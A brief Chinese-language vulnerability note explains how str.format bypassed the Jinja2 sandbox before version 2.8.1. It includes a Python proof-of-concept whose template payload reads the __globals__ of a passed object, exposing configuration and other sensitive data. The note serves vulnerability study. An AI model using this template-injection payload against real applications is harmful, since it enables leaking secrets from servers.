参考：
	- https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#jinja-281
	- https://www.palletsprojects.com/blog/jinja-281-released/

（Jinja2.8.1）

Jinja2在防御SSTI（模板注入漏洞）时引入了沙盒机制，也就是说即使模板引擎被用户所控制，其也无法绕过沙盒执行代码或者获取敏感信息。

但由于format带来的字符串格式化漏洞，导致在Jinja2.8.1以前的沙盒可以被绕过，进而读取到配置文件等敏感信息。

poc
```python
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
class User(object):
	def __init__(self, name):
		self.name = name
t = env.from_string('{{ "{0.__class__.__init__.__globals__}".format(user) }}')
t.render(user=User('joe'))
```
成功读取到当前环境所有变量__globals__